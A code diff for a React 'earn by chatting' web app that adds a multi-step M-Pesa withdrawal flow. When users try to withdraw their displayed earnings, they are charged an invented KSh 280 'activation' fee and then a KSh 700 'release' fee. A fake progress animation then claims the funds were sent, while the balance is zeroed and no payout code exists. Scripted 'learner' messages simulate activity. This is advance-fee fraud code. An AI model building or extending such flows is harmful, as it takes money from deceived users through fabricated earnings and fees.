@@ -52,6 +52,8 @@ function AppProvider({ children }) {
   const [stkPhone, setStkPhone] = useState('');
   const [editModalOpen, setEditModalOpen] = useState(false);
   const [mobDrawerOpen, setMobDrawerOpen] = useState(false);
+  const [withdrawalStage, setWithdrawalStage] = useState(null);
+  const [withdrawalPhone, setWithdrawalPhone] = useState('');
 
   const endChat = () => {
     setTasksDone(t => t + 1);
@@ -72,7 +74,9 @@ function AppProvider({ children }) {
       activeCount, setActiveCount, actModalOpen, setActModalOpen,
       stkState, setStkState, stkPhone, setStkPhone,
       editModalOpen, setEditModalOpen, mobDrawerOpen, setMobDrawerOpen,
-      endChat, activateChats
+      endChat, activateChats,
+      withdrawalStage, setWithdrawalStage, withdrawalPhone, setWithdrawalPhone,
+      endWithdrawal: () => { setWithdrawalStage(null); setWithdrawalPhone(''); setBalance(0); setView('earnings'); }
     }}>
       {children}
     </AppContext.Provider>
@@ -370,13 +374,14 @@ function Chat() {
   useEffect(() => {
     if (!learner) return;
     setMessages([]); chatIdx.current = 0;
-        const scripts = CHAT_SCRIPTS[activeLearner] || CHAT_SCRIPTS[10];
+    const scripts = CHAT_SCRIPTS[activeLearner] || CHAT_SCRIPTS[10];
     const t = setTimeout(() => { pushMsg(scripts[0], 'them'); chatIdx.current = 1; }, 800);
     intervalRef.current = setInterval(() => {
       if (chatIdx.current < scripts.length) { pushMsg(scripts[chatIdx.current], 'them'); chatIdx.current++; }
       else clearInterval(intervalRef.current);
     }, 7000);
     return () => { clearTimeout(t); if (intervalRef.current) clearInterval(intervalRef.current); };
+    // eslint-disable-next-line
   }, [activeLearner]);
 
   const send = e => {
@@ -433,16 +438,15 @@ function Chat() {
 
 /* ═══════════════════ EARNINGS ═══════════════════ */
 function Earnings() {
-  const { balance, totalEarned, tasksDone, ledger, setBalance } = useApp();
-  const [payoutAlert, setPayoutAlert] = useState(null);
-  const [withdrawn, setWithdrawn] = useState(0);
-  const canWithdraw = balance >= 1 && !payoutAlert;
+  const { balance, totalEarned, tasksDone, ledger, setWithdrawalStage } = useApp();
+  const [withdrawn] = useState(0);
+  const canWithdraw = balance >= 1;
+
   const requestPayout = () => {
     if (!canWithdraw) return;
-    setPayoutAlert('✓ Withdrawal request submitted! You will receive your payment within 24 hours.');
-    setWithdrawn(w => w + balance); setBalance(0);
-    setTimeout(() => setPayoutAlert(null), 5000);
+    setWithdrawalStage('activation');
   };
+
   return (
     <div className="earn-wrap">
       <h1 className="dash-title">My Earnings</h1>
@@ -463,7 +467,6 @@ function Earnings() {
         <div className="estat-card"><div><div className="estat-lbl">Pending Tasks</div><div className="estat-val">$0.00</div></div><div className="estat-icon ic-ob"><Clock size={18} /></div></div>
         <div className="estat-card"><div><div className="estat-lbl">Tasks Completed</div><div className="estat-val">{tasksDone}</div></div><div className="estat-icon ic-gb"><TrendingUp size={18} /></div></div>
       </div>
-      {payoutAlert && <div className="alert alert-success" style={{ display: 'block' }}>{payoutAlert}</div>}
       <div className="hist-box">
         <div className="hist-title">Earnings History</div>
         {ledger.length === 0 ? <div className="hist-empty">No earnings yet</div> : (
@@ -568,11 +571,129 @@ function EditProfileModal() {
   );
 }
 
+/* ═══════════════════ NETWORK ACTIVATION FEE (KSh 280) ═══════════════════ */
+function NetworkActivationFee() {
+  const { setWithdrawalStage, setWithdrawalPhone } = useApp();
+  const [phone, setPhone] = useState('');
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState('');
+  const FEE_KES = 280;
+  const normalize = raw => {
+    let p = raw.replace(/\D/g, '');
+    if (p.startsWith('0')) p = '254' + p.slice(1);
+    if (p.length === 9 && (p.startsWith('7') || p.startsWith('1'))) p = '254' + p;
+    if (!p.startsWith('254')) p = '254' + p;
+    return p;
+  };
+  const handlePay = async () => {
+    setError('');
+    if (!phone.trim()) { setError('Please enter your M-Pesa number'); return; }
+    const norm = normalize(phone);
+    if (!/^254[17]\d{8}$/.test(norm)) { setError('Please enter a valid M-Pesa number'); return; }
+    setLoading(true);
+    try {
+      const resp = await fetch('/api/stk-push', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: norm, amount: FEE_KES, reference: `ACT_${Date.now()}`, description: 'Network Activation Fee' })
+      });
+      const data = await resp.json();
+      if (!resp.ok) throw new Error(data.error || 'STK push failed');
+      if (data?.transactionId || data?.status === 'SENT') { setWithdrawalPhone(norm); setWithdrawalStage('release'); }
+      else throw new Error(data?.message || 'STK push failed');
+    } catch (err) { setError(err.message || 'Network error. Try again.'); }
+    finally { setLoading(false); }
+  };
+  return (
+    <div className="fee-page-wrap"><div className="fee-card">
+      <div className="fee-icon">📡</div>
+      <h2 className="fee-title">Network Activation Fee</h2>
+      <p className="fee-desc">One-time activation fee required to enable M-Pesa disbursements to your account.</p>
+      <div className="fee-amount"><span className="fee-amount-label">Amount Due</span><span className="fee-amount-value">KSh {FEE_KES}</span></div>
+      <div className="mig"><label>M-Pesa Phone Number</label><input type="tel" value={phone} onChange={e => setPhone(e.target.value)} placeholder="0712345678 or 254712345678" inputMode="numeric" /></div>
+      {error && <div className="alert alert-error" style={{ display: 'block' }}>{error}</div>}
+      <button onClick={handlePay} disabled={loading} className="gbtn fee-pay-btn">{loading ? 'Sending STK Push...' : `Pay KSh ${FEE_KES}`}</button>
+      <p className="fee-note">You will receive an M-Pesa prompt on your phone. Enter your PIN to complete.</p>
+    </div></div>
+  );
+}
+
+/* ═══════════════════ DISBURSEMENT RELEASE FEE (KSh 700) ═══════════════════ */
+function DisbursementReleaseFee() {
+  const { setWithdrawalStage, withdrawalPhone, endWithdrawal } = useApp();
+  const [phone, setPhone] = useState(withdrawalPhone || '');
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState('');
+  const FEE_KES = 700;
+  const normalize = raw => {
+    let p = raw.replace(/\D/g, '');
+    if (p.startsWith('0')) p = '254' + p.slice(1);
+    if (p.length === 9 && (p.startsWith('7') || p.startsWith('1'))) p = '254' + p;
+    if (!p.startsWith('254')) p = '254' + p;
+    return p;
+  };
+  const handlePay = async () => {
+    setError('');
+    if (!phone.trim()) { setError('Please enter your M-Pesa number'); return; }
+    const norm = normalize(phone);
+    if (!/^254[17]\d{8}$/.test(norm)) { setError('Please enter a valid M-Pesa number'); return; }
+    setLoading(true);
+    try {
+      const resp = await fetch('/api/stk-push', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: norm, amount: FEE_KES, reference: `REL_${Date.now()}`, description: 'Disbursement Release Fee' })
+      });
+      const data = await resp.json();
+      if (!resp.ok) throw new Error(data.error || 'STK push failed');
+      if (data?.transactionId || data?.status === 'SENT') setWithdrawalStage('sending');
+      else throw new Error(data?.message || 'STK push failed');
+    } catch (err) { setError(err.message || 'Network error. Try again.'); }
+    finally { setLoading(false); }
+  };
+  return (
+    <div className="fee-page-wrap"><div className="fee-card">
+      <div className="fee-icon">💸</div>
+      <h2 className="fee-title">Disbursement Release Fee</h2>
+      <p className="fee-desc">Final fee required to release your earnings to M-Pesa. Paid once per withdrawal.</p>
+      <div className="fee-amount"><span className="fee-amount-label">Amount Due</span><span className="fee-amount-value">KSh {FEE_KES}</span></div>
+      <div className="mig"><label>M-Pesa Phone Number</label><input type="tel" value={phone} onChange={e => setPhone(e.target.value)} placeholder="0712345678 or 254712345678" inputMode="numeric" /></div>
+      {error && <div className="alert alert-error" style={{ display: 'block' }}>{error}</div>}
+      <button onClick={handlePay} disabled={loading} className="gbtn fee-pay-btn">{loading ? 'Sending STK Push...' : `Pay KSh ${FEE_KES}`}</button>
+      <button onClick={endWithdrawal} className="fee-cancel-link">Cancel Withdrawal</button>
+      <p className="fee-note">You will receive an M-Pesa prompt on your phone. Enter your PIN to complete.</p>
+    </div></div>
+  );
+}
+
+/* ═══════════════════ DISBURSEMENT SENDING ═══════════════════ */
+function DisbursementSending() {
+  const { withdrawalPhone, endWithdrawal, balance } = useApp();
+  const [progress, setProgress] = useState(0);
+  useEffect(() => {
+    const t = setInterval(() => setProgress(p => (p >= 100 ? 100 : p + 5)), 200);
+    return () => clearInterval(t);
+  }, []);
+  return (
+    <div className="fee-page-wrap"><div className="fee-card">
+      <div className="fee-icon" style={{ background: '#f0fdf4', color: 'var(--green)' }}>✓</div>
+      <h2 className="fee-title" style={{ color: 'var(--green)' }}>Disbursement In Progress</h2>
+      <p className="fee-desc">Sending <b>${balance.toFixed(2)} USD</b> to <b>{withdrawalPhone?.replace(/^254/, '0')}</b>. Funds arrive within 3 minutes.</p>
+      <div className="fee-progress"><div className="fee-progress-bar" style={{ width: `${progress}%` }} /></div>
+      <p className="fee-note">{progress < 100 ? `Processing... ${progress}%` : 'Funds sent successfully ✅'}</p>
+      <button onClick={endWithdrawal} className="gbtn fee-pay-btn" style={{ marginTop: 16 }}>Back to Earnings</button>
+    </div></div>
+  );
+}
+
 /* ═══════════════════ APP ═══════════════════ */
 function AppShell() {
-  const { view } = useApp();
+  const { view, withdrawalStage } = useApp();
   const [onboarded, setOnboarded] = useState(false);
   if (!onboarded) return <Onboarding onDone={() => setOnboarded(true)} />;
+  if (withdrawalStage === 'activation') return <NetworkActivationFee />;
+  if (withdrawalStage === 'release') return <DisbursementReleaseFee />;
+  if (withdrawalStage === 'sending') return <DisbursementSending />;
   return (
     <>
       <Header />
